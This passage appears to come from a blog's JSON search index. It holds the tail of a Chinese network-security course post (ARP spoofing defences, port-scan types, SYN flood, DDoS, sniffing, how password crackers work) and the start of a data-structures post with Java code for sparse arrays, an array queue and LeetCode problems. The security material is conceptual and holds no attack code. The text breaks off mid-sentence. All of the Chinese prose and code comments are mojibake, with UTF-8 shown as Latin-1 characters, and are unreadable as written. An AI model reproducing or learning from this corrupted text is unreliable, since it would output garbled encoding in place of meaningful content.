è¿™é‡Œè¦ç¡®ä¿è¿™å°ARPæœåŠ¡å™¨ä¸è¢«æ”»å‡»è€…æ§åˆ¶ã€‚\n4.ä½¿ç”¨ARPæ¬ºéª—é˜²æŠ¤è½¯ä»¶ï¼Œ å¦‚ARPé˜²ç«å¢™ã€‚\n5.åŠæ—¶å‘ç°æ­£åœ¨è¿›è¡ŒARPæ¬ºéª—çš„ä¸»æœºï¼Œ å¹¶å°†å…¶éš”ç¦»ã€‚\n\n### 17.å»ºç«‹å£ä»¤éµå¾ªçš„è§„åˆ™\n\n1ã€ä¸ä½¿ç”¨å’Œç”¨æˆ·åç›¸åŒçš„å£ä»¤\n2ã€ä¸ä½¿ç”¨æ—¥æœŸå£ä»¤\n3ã€ä¸ä½¿ç”¨è‹±æ–‡å•è¯\n4ã€å°½é‡é€‰æ‹©é•¿çš„å£ä»¤\n5ã€ç»å¸¸æ›´æ¢å£ä»¤\n6ã€ä¸ä½¿ç”¨æœ‰è‡ªå·±ç›¸å…³ä¿¡æ¯çš„å£ä»¤\n\n### 18.ç«¯å£æ‰«æçš„åŸç†ä¸ç›®çš„\n\nç«¯å£æ‰«ææ˜¯é€šè¿‡å‘è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿçš„ TCP ç«¯å£æˆ– UDP ç«¯å£å‘é€æ¶ˆæ¯,è®°å½•ç›®æ ‡ç³»ç»Ÿçš„å“åº”,æœé›†åˆ°å¾ˆå¤šå…³äºç›®æ ‡ä¸»æœºçš„å„ç§æœ‰ç”¨çš„ä¿¡æ¯ã€‚\n\nç›®çš„ï¼šæ‰¾å‡ºä¸»æœºä¸Šæ‰€å¼€æ”¾çš„ç½‘ç»œæœåŠ¡\n\n### 19.SYN Flood\n\n**åŸç†**\n\nSYN Floodæ˜¯å½“å‰æœ€æµè¡Œçš„DoS(æ‹’ç»æœåŠ¡æ”»å‡»)ä¸DDoS(åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»)çš„æ–¹å¼ä¹‹ä¸€ï¼Œå®ƒæ˜¯åˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹çš„ç¼ºé™·ï¼Œå‘é€å¤§é‡ä¼ªé€ çš„TCPè¿æ¥è¯·æ±‚ï¼Œä»è€Œä½¿å¾—è¢«æ”»å‡»æ–¹èµ„æºè€—å°½(CPUæ»¡è´Ÿè·æˆ–å†…å­˜ä¸è¶³)çš„æ”»å‡»æ–¹å¼\n\n**ç›®çš„**\n\nå¯¼è‡´ç³»ç»Ÿæˆ–æœåŠ¡å™¨å®•æœºã€‚\n\n### 20.DDoSçš„å·¥ä½œæ–¹å¼\n\n**Distributed Denial of Service** æ˜¯æ”»å‡»è€…å¯»æ‰¾ç½‘ç»œä¸Šæœ‰æ¼æ´çš„ä¸»æœºï¼Œè¿›å…¥ç³»ç»Ÿååœ¨å…¶ä¸Šé¢å®‰è£…åé—¨ç¨‹åºï¼Œæ§åˆ¶å¤§é‡çš„è¢«å…¥ä¾µä¸»æœºåŒæ—¶å¯¹ç›®æ ‡å‘èµ·DoSæ”»å‡»ã€‚\n\n### 21.å…±äº«å¼ç½‘ç»œå’Œäº¤æ¢å¼ç½‘ç»œ\n\n**å…±äº«å¼ç½‘ç»œç›‘å¬çš„æ–¹æ³•**\n\næ—¢å¯ä»¥ç”¨è½¯ä»¶çš„æ–¹å¼å®ç°ï¼Œä¹Ÿå¯ä»¥ç”¨ç¡¬ä»¶è®¾å¤‡çš„å½¢å¼å®ç°\n\n- ç”±äºé›†çº¿å™¨ä¼šå¹¿æ’­æ‰€æœ‰æ•°æ®ï¼Œç½‘å¡åœ¨æ··æ‚æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰æµç»ç½‘å¡çš„æ•°æ®å¸§éƒ½ä¼šè¢«ç½‘å¡é©±åŠ¨ç¨‹åºä¸Šä¼ ç»™ç½‘ç»œå±‚\n\n- é€šè¿‡æ··æ‚æ¨¡å¼å—…æ¢åˆ°çš„æ•°æ®åŒ…ä¸Šä¼ åˆ°ç½‘ç»œå±‚åï¼Œç½‘ç»œå±‚å¤„ç†ç¨‹åºè¿˜è¦å¯¹å…¶ç›®çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯æœ¬åœ°IPï¼Œä¸¢å¼ƒ\n\n- æ‰€ä»¥ï¼Œå¦‚æœæ²¡æœ‰ä¸€ä¸ªç‰¹å®šçš„æœºåˆ¶ï¼Œä¸Šå±‚åº”ç”¨ä¹Ÿæ— æ³•æŠ“åˆ°ä¸å±äºè‡ªå·±çš„æ•°æ®åŒ…         \n\n**å…±äº«å¼ç½‘ç»œç›‘å¬çš„åŸç†**\n\n- å¦‚æœç½‘å¡è®¾ç½®æˆæ··æ‚æ¨¡å¼ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªå±€åŸŸç½‘å†…ä¼ è¾“çš„ä»»ä½•ä¿¡æ¯éƒ½å¯ä»¥è¢«è¯¥ç½‘ç»œæ¥å£æ¥æ”¶åˆ°ï¼Œä¸»æœºçš„è¿™ç§çŠ¶æ€å°±æ˜¯ç›‘å¬æ¨¡å¼\n- å¤„äºç›‘å¬æ¨¡å¼ä¸‹çš„ä¸»æœºå¯ä»¥ç›‘å¬åˆ°åŒä¸€ä¸ªç½‘æ®µä¸‹çš„å…¶ä»–ä¸»æœºå‘é€çš„æ•°æ®åŒ…\n\n**äº¤æ¢å¼ç½‘ç»œç›‘å¬çš„æ–¹æ³•**\n\né€šè¿‡å¯¹äº¤æ¢æœºã€ä¸»æœºã€ç½‘å…³ç­‰è¿›è¡Œæ¬ºéª—å¯ä»¥å®ç°å¯¹ç½‘ç»œçš„ç›‘å¬ã€‚å¦‚æº¢å‡ºæ”»å‡»ã€é‡‡ç”¨ARPæ¬ºéª—ã€MACæ¬ºéª—\n\n**äº¤æ¢å¼ç½‘ç»œç›‘å¬çš„åŸç†**\n\næ¯å—ç½‘å¡éƒ½å¯¹åº”å”¯ä¸€çš„ç¡¬ä»¶MACåœ°å€, å®ƒæœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼:æ™®é€šæ¨¡å¼å’Œæ··æ‚æ¨¡å¼ã€‚åœ¨æ™®é€šæ¨¡å¼ä¸‹, ç½‘å¡åªèƒ½æ¥æ”¶å‘é€ç»™è‡ªå·±çš„æ•°æ®åŒ…, å…¶å®ƒç»è¿‡çš„æ•°æ®åŒ…éƒ½è‡ªåŠ¨ä¸¢å¼ƒ;åœ¨æ··æ‚æ¨¡æ‚ä¸‹, ç½‘å¡åˆ™ä¼šæ¥æ”¶åœ¨åŒä¸€ç½‘æ®µä¸Šä¼ è¾“çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚å› ä¸ºç›‘å¬åªä¼šå‘ç”Ÿåœ¨å…±äº«å¼ç½‘ç»œä¸­, åœ¨äº¤æ¢å¼ç½‘ç»œä¸­, è¿™ç§ç®€å•åœ°å°†ç½‘å¡è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼æ˜¯ä¸èƒ½ç›‘å¬æ•´ä¸ªç½‘ç»œçš„, å› ä¸ºäº¤æ¢æœºæ˜¯å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚, æ¯ä¸ªç«¯å£å¯¹åº”ä¸åŒçš„MACåœ°å€, å½“æœ‰æ•°æ®åˆ°è¾¾äº¤æ¢æœºæ—¶, ä¼šä»ç‰¹å®šçš„ç«¯å£è½¬å‘æ•°æ®åŒ…ã€‚\n\n### 22.å£ä»¤ç ´è§£è½¯ä»¶çš„å·¥ä½œåŸç†\n\n![](https://img.jwt1399.top//img/20200809194307.png)\n\nå£ä»¤ç ´è§£å™¨é€šå¸¸ç”±å€™é€‰å£ä»¤äº§ç”Ÿå™¨ ã€ å£ä»¤åŠ å¯†æ¨¡å—å’Œå£ä»¤æ¯”è¾ƒæ¨¡å—ç»„æˆã€‚ \n\nå€™é€‰å£ä»¤äº§ç”Ÿå™¨ç”¨æ¥äº§ç”Ÿè®¤ä¸ºå¯èƒ½æ˜¯å£ä»¤çš„å•è¯ï¼Œ åœ¨å£ä»¤åŠ å¯†æ¨¡å—ï¼Œ ä½¿ç”¨çŸ¥é“çš„åŠ å¯†ç®—æ³•å¯¹å€™é€‰å£ä»¤åŠ å¯†ï¼Œ å°†åŠ å¯†åçš„å€™é€‰å£ä»¤å¯†æ–‡ä¸å®é™…å£ä»¤çš„å¯†æ–‡ä¸€èµ·é€åˆ°å£ä»¤æ¯”è¾ƒæ¨¡å—è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´ï¼Œ é‚£ä¹ˆï¼Œå½“å‰å€™é€‰å£ä»¤å‘ç”Ÿå™¨ä¸­é€å‡ºæ¥çš„å•è¯å°±æ˜¯è¦å¯»æ‰¾çš„å£ä»¤ï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œ é‚£ä¹ˆå€™é€‰å£ä»¤äº§ç”Ÿå™¨å†ç”Ÿæˆä¸‹ä¸€ä¸ªå€™é€‰å£ä»¤ã€‚\n\n### 23.ç½‘é¡µéªŒè¯ç çš„ä½œç”¨åŠé‡è¦æ€§ã€‚\n\n1ã€é˜²æ­¢ç”¨æˆ·ä½¿ç”¨ç¨‹åºè‡ªåŠ¨è¿›è¡Œæäº¤æ³¨å…¥\n\n2ã€é˜²æ­¢æš´åŠ›ç ´è§£ã€æ¶æ„æ³¨æ°´ç­‰\n\n3ã€ä¿è¯æœåŠ¡å™¨ç³»ç»Ÿçš„ç¨³å®šæ€§\n\n### 24.ç«¯å£æ‰«æ\n\nç›®çš„ï¼šæ‰¾å‡ºä¸»æœºä¸Šæ‰€å¼€æ”¾çš„ç½‘ç»œæœåŠ¡\n\n##### å…¨æ‰«æï¼ˆTCP Connectï¼‰\n\n**ä¼˜ç‚¹ï¼š**ä¸éœ€è¦ä»€ä¹ˆç‰¹æƒï¼Œæ‰€ä»¥å‡ ä¹æ‰€æœ‰çš„ç”¨æˆ·ï¼ˆåŒ…æ‹¬å¤šç”¨æˆ·ç¯å¢ƒä¸‹ï¼‰éƒ½å¯ä»¥é€šè¿‡connec()å‡½æ•°æ¥å®ç°è¿™ä¸ªæ“ä½œ\n\n**ç¼ºç‚¹ï¼š**è¿™ç§æ‰«ææ–¹æ³•ä¼šåœ¨æ—¥å¿—æ–‡ä»¶ä¸­ç•™ä¸‹å¤§é‡å¯†é›†çš„è¿æ¥å’Œé”™è¯¯è®°å½•ï¼Œå¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œå¹¶è¿‡æ»¤æ‰ã€‚\n\n##### åŠæ‰«æï¼ˆTCP SYNæ‰«æï¼‰\n\n**ä¼˜ç‚¹ï¼š**é‡‡ç”¨è¿™ç§ â€œåŠæ‰“å¼€æ‰«æâ€ï¼Œç›®æ ‡ç³»ç»Ÿå¹¶ä¸å¯¹å®ƒè¿›è¡Œç™»è®°ï¼Œ å› æ­¤æ¯”å…¨æ‰«ææ‰«ææ›´éšè”½ã€‚ å³ä½¿æ—¥å¿—ä¸­å¯¹äºæ‰«ææœ‰æ‰€è®°å½•ï¼Œ å¯¹å°è¯•è¿æ¥çš„è®°å½•ä¹Ÿè¦æ¯”å…¨æ‰«æçš„è®°å½•å°‘å¾—å¤šã€‚\n\n**ç¼ºç‚¹ï¼š**ä½†åœ¨å¤§éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¸­ï¼Œå‘é€ä¸»æœºéœ€è¦æ„é€ é€‚ç”¨äºè¿™ç§æ‰«æç±»å‹çš„IPåŒ…ï¼Œ é€šå¸¸åªæœ‰è¶…çº§ç”¨æˆ·æˆ–å¾—åˆ°æˆæƒçš„ç”¨æˆ·æ‰æœ‰æƒé™è®¿é—®ä¸“é—¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œ æ„é€ è¿™ç§ä¸“é—¨çš„SYNæ•°æ®åŒ…ï¼\n\n##### ç§˜å¯†æ‰«æï¼ˆTCP FINæ‰«æï¼‰\n\n**ä¼˜ç‚¹ï¼š**ç”±äºè¿™ç§æŠ€æœ¯ä¸åŒ…å«æ ‡å‡†çš„TCPä¸‰æ¬¡æ¡æ‰‹åè®®çš„ä»»ä½•éƒ¨åˆ†ï¼Œæ— æ³•è¢«è®°å½•ä¸‹æ¥ï¼Œ è¿™æ ·å°±æ¯”SYNæ‰«æè¦éšè”½å¾—å¤šã€‚\n\n**ç¼ºç‚¹ï¼š**ä¸SYNæ‰«æç±»ä¼¼ï¼Œ ç§˜å¯†æ‰«æä¹Ÿè¦ç”¨æˆ·å…·æœ‰ç‰¹æ®Šæƒé™ä»¥æ„é€ IPåŒ…ã€‚ å¦å¤–ï¼Œ ç”±äºè¿™ç§æŠ€æœ¯æ˜¯åˆ©ç”¨äº†æŸäº›æ“ä½œç³»ç»Ÿå®ç°TCP/IPåè®®æ—¶çš„æ¼æ´ï¼Œå› æ­¤ï¼Œå¹¶ä¸æ˜¯å¯¹æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿéƒ½æœ‰æ•ˆï¼Œé€šå¸¸åªåœ¨åŸºäºUNIXçš„TCP/IPåè®®æ ˆä¸Šå¯ä»¥æˆåŠŸåœ°åº”ç”¨ï¼Œè€Œåœ¨Windows NT ç¯å¢ƒä¸‹ï¼Œè¯¥æ–¹æ³•æ— æ•ˆã€‚\n\n### 25.ç½‘ç»œå®‰å…¨\n\n**å®ç°çš„åŸºæœ¬ç›®æ ‡**\n\nç½‘ç»œå®‰å…¨çš„åŸºæœ¬ç›®æ ‡æ˜¯å®ç°ä¿¡æ¯çš„å®Œæ•´æ€§ã€æœºå¯†æ€§ã€å¯ç”¨æ€§ã€åˆæ³•æ€§\n\n**ç½‘ç»œå­˜åœ¨å®‰å…¨å¨èƒçš„åŸå› **\n\n- å†…éƒ¨æ“ä½œä¸å½“\n- å†…éƒ¨ç®¡ç†ä¸ä¸¥\n- æ¥è‡ªå¤–éƒ¨çš„å¨èƒ\n- TCP/IPåè®®æ—çš„æ¼æ´\n  - ARPæ¬ºéª—\n  - SYN FLOODæ”»å‡»\n\n### 26.é»‘å®¢å…¥ä¾µçš„è¿‡ç¨‹\n\n**å…¥ä¾µç³»ç»Ÿçš„å¸¸ç”¨æ­¥éª¤**\n\n![](https://i.loli.net/2020/05/14/YKnzbmkFWg4HyXu.png)\n\n **è¾ƒé«˜æ˜çš„å…¥ä¾µæ­¥éª¤**\n\n![](https://i.loli.net/2020/05/14/Ln7kaQCYID6TNeb.png)\n\n  \n\n## **èµåŠ©ğŸ’°**\n\n**å¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­**\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["ç½‘ç»œæ”»é˜²"],"categories":["Course"]},{"title":"æ•°æ®ç»“æ„ä¸ç®—æ³•","url":"/posts/40445.html","content":"\n# ä¸€ã€æ•°æ®ç»“æ„\n\n> çº¿æ€§ç»“æ„ï¼šæ•°ç»„ã€é˜Ÿåˆ—ã€é“¾è¡¨ã€æ ˆ\n>\n> - é¡ºåºå­˜å‚¨ï¼ˆåœ°å€è¿ç»­ï¼‰\n> - é“¾å¼å­˜å‚¨ï¼ˆåœ°å€ä¸ä¸€å®šè¿ç»­ï¼‰\n>\n> éçº¿æ€§ç»“æ„ï¼šäºŒç»´æ•°ç»„ã€å¤šç»´æ•°ç»„ã€å¹¿ä¹‰è¡¨ã€æ ‘ã€å›¾\n\n------\n\n\n\n## â‘ æ•°ç»„\n\n### â¶ç¨€ç–æ•°ç»„\n\nç¨€ç–æ•°ç»„æ˜¯ä¸€ç§ç”¨æ¥å‹ç¼©æ•°æ®é‡çš„æ•°æ®ç»“æ„ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯è®°å½•ç‰¹æ®Šå€¼ï¼Œç„¶åå‰©ä¸‹å¤§é‡é‡å¤çš„æ•°æ®å¯ä»¥æ¶ˆå‡ã€‚\n\nä¾‹å¦‚ä¸‹æ–¹æ˜¯ä¸€ä¸ªæ™®é€šäºŒç»´æ•°ç»„\n\n```\n0 0 0 0 0 0\n0 0 1 0 0 0\n0 0 0 2 0 0\n0 0 0 0 0 0\n0 0 0 0 0 0\n0 0 0 0 0 0\n```\n\nè¿™ä¹ˆä¸€ä¸ªäºŒç»´æ•°ç»„ï¼ŒåŒ–æˆç¨€ç–æ•°ç»„å¯ä»¥è¡¨ç¤ºä¸ºï¼š\n\n```properties\n   è¡Œ åˆ— å€¼\n0  6  6  2\n1  1  2  1\n2  2  3  2\n\n1. ç¨€ç–æ•°ç»„ç¬¬ä¸€è¡Œè¡¨ç¤ºåŸæ•°ç»„æœ‰å¤šå°‘è¡Œï¼Œå¤šå°‘åˆ—ï¼Œæœ‰å¤šå°‘ä¸ªéé›¶å…ƒç´ ï¼ˆæœ‰æ•ˆå€¼ï¼‰\n2. ç¨€ç–æ•°ç»„æ˜¯ä»0å¼€å§‹çš„\n3. ç¨€ç–æ•°ç»„çš„è¡Œæ•°ç­‰äºæœ‰æ•ˆå€¼+1ï¼Œåˆ—æ•°å›ºå®šéƒ½ä¸º3\n```\n\näºŒç»´æ•°ç»„è½¬ç¨€ç–æ•°ç»„çš„æ­¥éª¤ï¼š\n\n- éå†äºŒç»´æ•°ç»„ï¼Œå¾—åˆ°æœ‰æ•ˆå€¼ä¸ªæ•° sum\n- æ ¹æ® sum åˆ›å»ºç¨€ç–æ•°ç»„ sparseArr = int [sum+1]\\[3]\n- å°†æœ‰æ•ˆå€¼å­˜å…¥ç¨€ç–æ•°ç»„\n\nè¿˜åŸç¨€ç–æ•°ç»„æ­¥éª¤ï¼š\n\n- åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œå…¶è¡Œå’Œåˆ—ç­‰äºç¨€ç–æ•°ç»„é¦–è¡Œæ•°æ®\n\n- éå†ç¨€ç–æ•°ç»„ï¼Œå°†å¯¹åº”æ•°å€¼èµ‹å€¼ç»™æ–°çš„æ•°ç»„\n\n- æœ€åå¯ä»¥éªŒè¯ä¸€ä¸‹åŸå§‹çš„æ•°ç»„å’Œè¿˜åŸåçš„æ•°ç»„æ˜¯å¦ç›¸ç­‰\n\n```java\n//ç¨€ç–æ•°ç»„ï¼šç”¨æ¥å‡å°‘æ•°æ®é‡\npublic class SparseArray {\n    public static void main(String[] args) {\n        // ä¸€ã€æ„å»ºåŸå§‹æ•°ç»„\n        // åˆ›å»ºä¸€ä¸ªäºŒç»´æ•°ç»„6*6  0ï¼šæ²¡æœ‰æ£‹å­ï¼Œ1ï¼šé»‘æ£‹  2ï¼šç™½æ£‹\n        int[][] chessArr = new int[6][6];\n        chessArr[1][2] = 1;\n        chessArr[2][3] = 2;\n        System.out.println(\"åŸå§‹æ•°ç»„:\");\n        for (int[] row : chessArr) {\n            for (int data : row) {\n                System.out.print(data+\"\\t\");\n            }\n            System.out.println();\n        }\n        System.out.println(\"====================\");\n\n        // äºŒã€è½¬æ¢æˆç¨€ç–æ•°ç»„\n        int sum = 0;\n        //1.å…ˆéå†äºŒç»´æ•°ç»„ï¼Œè·å–æœ‰æ•ˆå€¼çš„ä¸ªæ•°\n        for (int i = 0; i < chessArr.length; i++) {\n            for (int j = 0; j < chessArr[0].length; j++) {\n                if(chessArr[i][j] != 0) {\n                    sum++;//æœ‰æ•ˆå€¼çš„ä¸ªæ•°\n                }\n            }\n        }\n        //2.åˆ›å»ºå¯¹åº”ç¨€ç–æ•°ç»„\n        int [][]sparseArr = new int[sum+1][3];\n        //ç¬¬ä¸€è¡Œèµ‹å€¼\n        sparseArr[0][0] = chessArr.length;\n        sparseArr[0][1] = chessArr[0].length;\n        sparseArr[0][2] = sum;\n        //3.éå†åˆå§‹çš„äºŒç»´æ•°ç»„ï¼Œå°†éé›¶çš„å€¼ï¼Œå­˜æ”¾åˆ°ç¨€ç–æ•°ç»„ä¸­\n        int count = 0;\n        for (int i = 0; i < chessArr.length; i++) {\n            for (int j = 0; j < chessArr[0].length; j++) {\n                if (chessArr[i][j] != 0){\n                    count++;\n                    sparseArr[count][0] = i;\n                    sparseArr[count][1] = j;\n                    sparseArr[count][2] = chessArr[i][j];\n                }\n            }\n        }\n        //4.è¾“å‡ºç¨€ç–æ•°ç»„\n        System.out.println(\"ç¨€ç–æ•°ç»„:\");\n        for (int i = 0; i < sparseArr.length; i++) {\n            System.out.println(sparseArr[i][0]+\"\\t\"+sparseArr[i][1]+\"\\t\"+sparseArr[i][2]+\"\\t\");\n        }\n\n        // ä¸‰ã€è¿˜åŸæ•°ç»„\n        int [][] ChessArr2 = new int[sparseArr[0][0]][sparseArr[0][1]];\n        for (int i = 1; i < sparseArr.length; i++) {\n            ChessArr2[sparseArr[i][0]][sparseArr[i][1]] = sparseArr[i][2];\n        }\n        System.out.println(\"=======================\");\n        //æ‰“å°è¿˜åŸçš„æ•°ç»„\n        System.out.println(\"è¾“å‡ºè¿˜åŸåçš„æ•°ç»„ï¼š\");\n        for (int[] row : ChessArr2) {\n            for (int data : row) {\n                System.out.print(data+\"\\t\");\n            }\n            System.out.println();\n        }\n\n\n        //å››ã€éªŒè¯ä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸ç­‰ï¼Œå¯ç”¨Arrayså·¥å…·ç±»\n        int flag = 0;\n        for (int i = 0; i < chessArr.length; i++) {\n            if (!Arrays.equals(chessArr[i],ChessArr2[i])){\n                flag++;\n            }\n        }\n        if (flag==0){\n            System.out.println(\"åˆå§‹æ•°ç»„å’Œè¿˜åŸåçš„æ•°ç»„ç›¸ç­‰\");\n        }\n    }\n}\n```\n\n### â·æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ—\n\né˜Ÿåˆ—æœ¬èº«æ˜¯æœ‰åºåˆ—è¡¨ï¼Œè‹¥ä½¿ç”¨æ•°ç»„çš„ç»“æ„æ¥å­˜å‚¨é˜Ÿåˆ—çš„æ•°æ®ï¼Œåˆ™é˜Ÿåˆ—æ•°ç»„çš„å£°æ˜å¦‚ä¸‹å›¾\n\nmaxSize æ˜¯è¯¥é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡ï¼Œä¸¤ä¸ªå˜é‡ front åŠ rear åˆ†åˆ«è®°å½•é˜Ÿåˆ—å‰åç«¯çš„ä¸‹æ ‡\n\n![](https://img.jwt1399.top/img/202209212055227.png)\n\n```java\nclass ArrayQueue {\n    private int MaxSize;  // é˜Ÿåˆ—å¤§å°\n    private int front;   // é˜Ÿåˆ—å¤´\n    private int rear;   // é˜Ÿåˆ—å°¾\n    private int[] arr; // æ•°ç»„å­˜æ”¾æ•°æ®\n\n    // ä¸€ã€åˆ›å»ºé˜Ÿåˆ—çš„æ„é€ å™¨\n    public ArrayQueue(int MaxSize) {\n        this.MaxSize = MaxSize;\n        arr = new int[this.MaxSize];\n        front = -1;\n        rear = -1;\n    }\n\n    //äºŒã€åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦æ»¡\n    public boolean isFull() {\n        return rear == MaxSize - 1;\n    }\n\n    //ä¸‰ã€åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ç©º\n    public boolean isEmpty() {\n        return rear == front;\n    }\n\n    //å››ã€å…¥é˜Ÿ\n    public void addQueue(int num) {\n        if (isFull()) {\n            System.out.println(\"é˜Ÿåˆ—å·²æ»¡ï¼Œæ— æ³•åœ¨è¿›è¡Œå…¥é˜Ÿæ“ä½œ\");\n            return;\n        }\n        arr[++rear] = num;\n    }\n\n    //äº”ã€å‡ºé˜Ÿ\n    public int getQueue() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•å‡ºé˜Ÿ\");\n        }\n        return arr[++front];\n    }\n\n    //å…­ã€æ˜¾ç¤ºé˜Ÿåˆ—æ•°æ®\n    public void showQueue() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•éå†\");\n        }\n        for (int i = front+1; i < arr.length; i++) {\n            System.out.printf(\"arr[%d]=%d\\n\", i, arr[i]);\n        }\n    }\n\n    //ä¸ƒã€æ˜¾ç¤ºé˜Ÿåˆ—å¤´æ•°æ®\n    public int headQueue() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"é˜Ÿåˆ—ä¸ºç©ºï¼Œæ²¡æœ‰æ•°æ®\");\n        }\n        return arr[front + 1];\n    }\n\n}\n```\n\næµ‹è¯•\n\n```java\npublic class ArrayQueueDemo {\n    public static void main(String[] args) {\n        // æ„é€ é˜Ÿåˆ—\n        ArrayQueue queue = new ArrayQueue(5);\n        // å…¥é˜Ÿ\n        queue.addQueue(1);\n        queue.addQueue(2);\n        queue.addQueue(3);\n        queue.addQueue(4);\n        queue.addQueue(5);\n        // å‡ºé˜Ÿ\n        System.out.println(queue.getQueue());\n        // éå†é˜Ÿåˆ—\n        queue.showQueue();\n        // é˜Ÿé¦–\n        System.out.println(queue.headQueue());\n\n    }\n}\n```\n\n### â¸LeetCodeçœŸé¢˜\n\n#### äºŒåˆ†æ³•ï¼š[704. äºŒåˆ†æŸ¥æ‰¾ ](https://leetcode.cn/problems/binary-search/)\n\nç»™å®šä¸€ä¸ª `n` ä¸ªå…ƒç´ æœ‰åºçš„ï¼ˆå‡åºï¼‰æ•´å‹æ•°ç»„ `nums` å’Œä¸€ä¸ªç›®æ ‡å€¼ `target`  ï¼Œå†™ä¸€ä¸ªå‡½æ•°æœç´¢ `nums` ä¸­çš„ `target`ï¼Œå¦‚æœç›®æ ‡å€¼å­˜åœ¨è¿”å›ä¸‹æ ‡ï¼Œå¦åˆ™è¿”å› `-1`ã€‚\n\n\n**ç¤ºä¾‹ 1:**\n\n```properties\nè¾“å…¥: nums = [-1,0,3,5,9,12], target = 9\nè¾“å‡º: 4\nè§£é‡Š: 9 å‡ºç°åœ¨ nums ä¸­å¹¶ä¸”ä¸‹æ ‡ä¸º 4\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: nums = [-1,0,3,5,9,12], target = 2\nè¾“å‡º: -1\nè§£é‡Š: 2 ä¸å­˜åœ¨ nums ä¸­å› æ­¤è¿”å› -1\n```\n\n```java\nclass Solution {\n    public int search(int[] nums, int target) {\n        // é¿å…å½“ target å°äºnums[0] å¤§äºnums[nums.length - 1]æ—¶å¤šæ¬¡å¾ªç¯è¿ç®—\n        if (target < nums[0] || target > nums[nums.length - 1]) {\n            return -1;\n        }\n        int left = 0;\n        int right = nums.length - 1;\n        while(left <= right){\n            int mid = left + ((right - left) >> 1);// é˜²æ­¢æº¢å‡º ç­‰åŒäº(left + right)/2\n            if(nums[mid] == target){\n                return mid;\n            }\n            else if(nums[mid] < target){\n                left = mid + 1;\n            }else{\n                right = mid -1;\n            }\n        }\n        return -1;\n    }\n}\n```\n\n#### åŒæŒ‡é’ˆï¼š[27. ç§»é™¤å…ƒç´ ](https://leetcode.cn/problems/remove-element/)\n\nç»™ä½ ä¸€ä¸ªæ•°ç»„ `nums` å’Œä¸€ä¸ªå€¼ `val`ï¼Œä½ éœ€è¦åŸåœ°ç§»é™¤æ‰€æœ‰æ•°å€¼ç­‰äº `val` çš„å…ƒç´ ï¼Œå¹¶è¿”å›ç§»é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚\n\nä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»ä»…ä½¿ç”¨ `O(1)` é¢å¤–ç©ºé—´å¹¶åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„ã€‚\n\nå…ƒç´ çš„é¡ºåºå¯ä»¥æ”¹å˜ã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚\n\n```java\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        //å¿«æ…¢æŒ‡é’ˆè§£æ³•\n        int slow = 0; //æ…¢æŒ‡é’ˆ\n        //å¿«æŒ‡é’ˆï¼Œæ— è®ºä¸valå€¼æ˜¯å¦ç›¸åŒæ¯éå†ä¸€æ¬¡éƒ½è¦ç§»åŠ¨ä¸€ä½\n        for(int fast = 0; fast < nums.length; fast++){\n            //å¿«æŒ‡é’ˆå…ˆèµ°ï¼Œåˆ¤æ–­å¿«æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ æ˜¯å¦ç­‰äºval\n            if(nums[fast] != val){\n                nums[slow] = nums[fast];\n                slow++;  //åªæœ‰å½“å¿«æŒ‡é’ˆä¸ç­‰äºvalçš„æ—¶å€™ï¼Œæ…¢æŒ‡é’ˆæ‰å’Œå¿«æŒ‡é’ˆä¸€èµ·ç§»åŠ¨ä¸€ä½\n            }\n        }\n        return slow;\n    }\n}\n\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        int idx = 0;\n        for (int x : nums) {\n            if (x != val) nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n```\n\n#### åŒæŒ‡é’ˆï¼š[977. æœ‰åºæ•°ç»„çš„å¹³æ–¹](https://leetcode.cn/problems/squares-of-a-sorted-array/)\n\nç»™ä½ 